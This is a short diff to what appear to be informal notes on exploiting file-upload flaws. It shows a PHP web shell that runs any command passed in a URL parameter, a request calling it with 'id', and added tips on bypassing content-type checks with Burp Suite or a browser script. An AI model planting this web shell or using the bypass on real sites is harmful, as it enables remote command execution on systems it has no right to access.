@@ -10,3 +10,8 @@ and then acces the webshell
 
 <?php echo system($_GET['command']); ?>
 xample/exploit.php?command=id HTTP/1.1
+
+## formdata
+sometimes it only checks if a content type is image/png or something
+you can ez do it in burpsuite
+or with js see "script/file_upload_blob.js" you could just execute this in console
